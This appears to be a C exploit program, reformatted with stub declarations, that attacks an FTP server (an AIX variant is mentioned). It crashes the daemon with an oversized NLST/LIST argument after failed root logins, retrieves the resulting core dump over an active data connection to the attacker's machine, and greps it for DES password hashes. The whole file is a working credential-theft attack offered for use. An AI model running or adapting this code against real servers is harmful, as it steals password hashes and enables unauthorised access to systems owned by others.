#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  yo ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  cli ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EOF ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 int O_CREAT ; 
 int O_WRONLY ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int accept (int,struct sockaddr*,int*) ; 
 int atoi (char*) ; 
 scalar_t__ bind (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  bzero (struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 int createconnection (char*,char*) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  getline (int) ; 
 int getopt (int,char**,char*) ; 
 int getpid () ; 
 int /*<<< orphan*/  htonl (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  htons (int) ; 
 char* in ; 
 scalar_t__ listen (int,int) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memset (char*,char,int) ; 
 int open (char*,int) ; 
 int /*<<< orphan*/  out ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  putline (int,int /*<<< orphan*/ ) ; 
 int recv (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  snprintf (int /*<<< orphan*/ ,int,char*,...) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int /*<<< orphan*/  strlen (char*) ; 
 int /*<<< orphan*/ * strstr (char*,char*) ; 
 scalar_t__ strtok (char*,char*) ; 
 int /*<<< orphan*/  system (char*) ; 
 int /*<<< orphan*/  usage (char*) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc, char *argv[])
{
 extern int optind;
 extern char *optarg;
 int haveuser=0,havepassword=0;
 int s,s2,nsock;
 int c,k,len;
 int fd;

 char *target = NULL;
 char *username = "ftp";
 char *password = "guest";
 char *writeto = "pub";
 char *crackme = "root";
 char *targetport = "21";
 int uselist = 0;
 char *myip = NULL;
 char *as = NULL;
 int octet_in[4], port;
 struct sockaddr_in yo, cli;
 char *oct = NULL;

 while ((c = getopt(argc, argv, "h:i:p:l:k:d:c:s")) != EOF) {
  switch(c) {
  case 'h':
    target = (char*)malloc(strlen(optarg)+1);
    strcpy(target, optarg);
  break;
  case 'i':
    myip = (char*)malloc(strlen(optarg)+1);
    strcpy(myip, optarg);
  break;
  case 'p':
    targetport = (char*)malloc(strlen(optarg)+1);
    strcpy(targetport, optarg);
  break;
  case 'l':
    username = (char*)malloc(strlen(optarg)+1);
    strcpy(username, optarg);
    haveuser = 1;
  break;
  case 'k':
    password = (char*)malloc(strlen(optarg)+1);
    strcpy(password, optarg);
    havepassword = 1;
  break;
  case 'd':
    writeto = (char*)malloc(strlen(optarg)+1);
    strcpy(writeto, optarg);
  break;
  case 'c':
    crackme = (char*)malloc(strlen(optarg)+1);
    strcpy(crackme, optarg);
  break;
  case 's':
    uselist = 1;
  break;
  default:
    usage(argv[0]);
  }
 }

 if (target == NULL || myip == NULL)
  usage(argv[0]);

 if ((haveuser && !havepassword) || (!haveuser && havepassword)) {
  usage(argv[0]);
 }

 s = createconnection(target, targetport);
 getline(s);

 fprintf(stderr, "populating DES hash in memory...\n");

 for (k=0;k<3;k++) { 
  snprintf(out, sizeof out, "USER %s\r\n", crackme);
  putline(s, out); 
  getline(s);
  snprintf(out, sizeof out, "PASS abcdef\r\n");
  putline(s,out);
  getline(s);
 }

 fprintf(stderr, "logging in...\n");

 snprintf(out, sizeof out, "USER %s\r\n", username);
 putline(s, out); 
 getline(s);
 snprintf(out, sizeof out, "PASS %s\r\n", password);
 putline(s,out);
 getline(s);
 getline(s);

 fprintf(stderr, "changing directory...\n");

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);
 putline(s, out); 
 getline(s);

 fprintf(stderr, "triggering segmentation violation...\n");

 as = (char*)malloc(2000);
 memset(as, 'A', 2000);
 as[2000-1]=0;

 if (!uselist) {
  snprintf(out, sizeof out, "NLST ~%s\r\n", as);
 } else {
  /* AIX 5.3 trigger - thanks to karol */
  snprintf(out, sizeof out, "LIST ~%s\r\n", as);
 }
 putline(s, out);

 memset(in, '\0', sizeof in);
 if (recv(s, in, sizeof in, 0) < 1) {
  printf("trigger succeeded!\nwaiting for core file to be created...\n");
 } else {
  printf("trigger seems to have failed, proceeding anyways...\n"
  "\nwaiting for core file to be created...\n");
 }

 sleep(5);

 close(s);

 s = createconnection(target, targetport);
 getline(s);

 fprintf(stderr, "logging in 2nd time...\n");

 snprintf(out, sizeof out, "USER %s\r\n", username);
 putline(s, out); 
 getline(s);
 snprintf(out, sizeof out, "PASS %s\r\n", password);
 putline(s,out);
 getline(s);
 getline(s);

 fprintf(stderr, "changing directory...\n");

 snprintf(out, sizeof out, "CWD %s\r\n", writeto);
 putline(s, out); 
 getline(s);

 fprintf(stderr, "getting core file...\n");

 snprintf(out, sizeof out, "TYPE I\r\n");
 putline(s, out); 
 getline(s);

 port = getpid() + 1024;
 len = sizeof(cli);

 bzero(&yo, sizeof(yo));
 yo.sin_family = AF_INET;
 yo.sin_port=htons(port);
 yo.sin_addr.s_addr = htonl(INADDR_ANY);

 oct=(char *)strtok(myip,".");
 octet_in[0]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[1]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[2]=atoi(oct);
 oct=(char *)strtok(NULL,".");
 octet_in[3]=atoi(oct);

 snprintf(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);
 putline(s, out); 
 getline(s); 

 if ((s2=socket(AF_INET, SOCK_STREAM, 0)) < 0) {
  perror("socket");
  return -1;
 }

 if ((bind(s2, (struct sockaddr *) &yo, sizeof(yo))) < 0) {
  perror("bind");
  close(s2);
  exit(1);
 }

 if (listen(s2, 10) < 0) {
  perror("listen");
  close(s2);
  exit(1);
 }

 snprintf(out, sizeof out, "RETR core\r\n");
 putline(s, out); 
 getline(s); 
 if (strstr(in, "150") == NULL) {
  fprintf(stderr, "core file not found... terminating.\n");
  close(s);
  exit(1);
 }

 fd = open("core", O_WRONLY | O_CREAT);
 if (fd == -1) {
  perror("open on local core file");
  close(s);
  exit(1);
 }

 sleep(1);

 if ((nsock = accept(s2, (struct sockaddr *)&cli, &len)) < 0) {
  perror("accept");
  close(s);
  exit(1);
 }

 do {
  k = recv(nsock, in, sizeof in, 0);
  if (k < 1) break;
  write(fd, in, k);
 } while (k > 0);

 close(nsock);
 close(fd);
 close(s); 

 fprintf(stderr, "finally extracting DES hashes from core file for user '%s'...\n", crackme);
 system("strings core | grep '^[A-Za-z0-9]\\{13\\}$'");

 fprintf(stderr, "done.\n");
 return 0;
}